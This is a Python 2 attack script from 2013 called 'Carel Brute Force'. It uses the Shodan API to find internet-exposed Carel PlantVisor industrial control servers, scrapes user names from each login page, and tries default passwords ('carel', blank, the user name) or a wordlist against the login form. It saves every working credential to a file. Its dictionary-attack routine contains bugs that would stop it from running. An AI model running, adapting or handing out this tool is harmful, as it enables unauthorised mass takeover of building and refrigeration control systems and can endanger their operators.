#!/usr/bin/python2

#############################################
# 	Carel Brute Force (carelbf.py)           #
# 	Copyright (c) 2013, Angel Garcia (Ell0)  #
# 			angel@sec-root.com                 #
#############################################

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

from shodan import WebAPI
import sys
import urllib2

class carel_server:
	def __init__(self):
		self.ip = ''
		self.logins = {}
	
	def print_ip(self, of):
		of.write(self.ip + '\n')

	def print_logins(self, of):
		for l, p in self.logins.iteritems():
			if (p != ''):
				of.write(self.ip + "\t" + l + "\t" + p + "\n")

	def get_users(self):
		try:
			url = 'http://' + self.ip +'/'
			print "Getting users from "+ url
			req = urllib2.urlopen(url)
			portal_html = req.read()
		except:
			print 'ERROR: %s' % self.ip
			return 0
		start = portal_html.find('<option value=', 1)
		while (start != -1):
			start += 15
			end = portal_html.find('"', start)
			#end -= 1
			user = portal_html[start:end]
			self.logins[user] = ''
			start = portal_html.find('<option value=', end)
		return 1
	
	def try_password(self, user, password):
		try:
			url = 'http://' + self.ip +'/First.htm'
			data = 'LoginName=' + user+ '&LoginPassword=' + password + '&%3Fscript%3ALogin%28LoginName%2CLoginPassword%29=Ok'
			req = urllib2.urlopen(url, data)
			portal_html = req.read()
		except:
			print 'ERROR: %s' % self.ip 
		if ((portal_html.find('>Pl@ntVisor')) != -1):
			return 1
		else:
			return 0

	def simple_passwords_attack(self):
		print 'Trying simple passwords for ' + self.ip
		for u in self.logins.keys():
			simple_passwords = [u, 'carel', '']
			found = 0
			i = 0
			while ((i < len(simple_passwords)) and (not found)):
				found = self.try_password(u, simple_passwords[i])
				if (found):
					self.logins[u] = simple_passwords[i]
				i += 1
			
	def dictionary_attack(self, dictfile):
		print 'Trying dictionary attack for ' + self.ip
		for u in self.logins.keys():
			df = open(dictfile, 'r')
			found = 0
			while ((p in df) and (not found)):
				found = self.try_password(self, u, p)
				if (found):
					self.logins[u] = p
			df.close()


###############################

def servers_search(api, servers):
	print 'Searching CarelDataServer hosts...\n'
	try:
		# Search Shodan
		results = api.search('CarelDataServer')
		# Show the results
		print 'Results found: %s' % results['total']
		for result in results['matches']:
			#print 'IP: %s' % result['ip']
			#print result['data']
			#print ''
			server = carel_server()
			server.ip = result['ip']
			servers.append(server)
	except Exception, e:
		print 'Error: %s' % e

def servers_load(inputfile, servers):
	print 'Loading servers from ' + inputfile + '...'
	inf = open(inputfile, 'r')
	for line in inf:
		server = carel_server()
		server.ip = line.replace('\n', '')
		servers.append(server)
	inf.close()


def main():
# Functional options:
# -s -> Just Search CarelDataServer hosts. Execution result is a text file with one host per line
# -sbf -> Search and BruteForce. Execution result is a text file with hosts and possible users/passwords in those hosts
# -bf -> Just BruteForce. Input file with one host per line. Execution result is an output text file with hosts and valid users/passwords
#
# Bruteforce methods:
# -sp -> Just Simple Passwords
# -da -> Dictionary Attack. Input file with one password per line
	
	func = raw_input('Select functionality (s/sbf/bf): ')
	while ((func != 's') and (func != 'sbf') and (func != 'bf')):
		func = raw_input('WRONG OPTION! Select functionality (s/sbf/bf): ')
	
	if ((func == 'sbf') or (func == 'bf')):
		bfm = raw_input('Select brute force method (sp/da): ')
		while ((bfm != 'sp') and (bfm != 'da')):
			func = raw_input('WRONG OPTION! Select brute force method (sp/da): ')
	
	servers = []
	
	outfile = raw_input('Output file name: ')
	if ((func == 's') or (func =='sbf')):
		SHODAN_API_KEY = raw_input('Shodan API key: ')
		api = WebAPI(SHODAN_API_KEY)
		servers_search(api, servers)
		if (func == 's'):
			of = open(outfile, 'w')
			for s in servers:
				s.print_ip(of)
			of.close()
	
	if ((func == 'sbf') or (func == 'bf')):
		if (func == 'bf'):
			inputfile = raw_input('Hosts file name: ')
			servers_load(inputfile, servers)

		if (bfm == 'da'):
			dictfile = raw_input('Dictionary file name: ')
		
		of = open(outfile, 'w')
		for s in servers:
			s.get_users()
			s.simple_passwords_attack()
			if (bfm == 'da'):
				s.dictionary_attack(dictfile)
			s.print_logins(of)
		of.close()
			

if __name__ == '__main__':
	main()
